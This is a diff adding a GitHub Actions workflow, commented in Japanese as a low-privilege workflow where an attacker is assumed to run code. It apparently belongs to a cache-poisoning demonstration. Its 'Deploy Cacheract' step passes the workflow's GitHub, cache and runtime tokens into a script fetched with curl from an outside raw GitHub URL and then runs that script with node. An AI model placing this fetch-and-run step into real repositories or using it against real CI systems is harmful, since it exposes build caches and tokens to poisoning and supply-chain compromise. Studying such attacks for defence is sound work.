@@ -1,0 +1,29 @@
+# .github/workflows/trigger-low-priv.yml
+# Workflow A: 低権限の workflow（攻撃者がコード実行を得る想定）
+name: Low Privilege Workflow
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  deploy-cacheract:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+
+      - name: Deploy Cacheract
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          ACTIONS_CACHE_URL: ${{ env.ACTIONS_CACHE_URL }}
+          ACTIONS_RUNTIME_TOKEN: ${{ env.ACTIONS_RUNTIME_TOKEN }}
+        run: |
+          # Cacheract のバンドルをダウンロードして実行
+          curl -sSfL https://raw.githubusercontent.com/yuseiHiratsuka/gh-action-utils/main/cacheract.js > /tmp/cacheract.js
+          node /tmp/cacheract.js
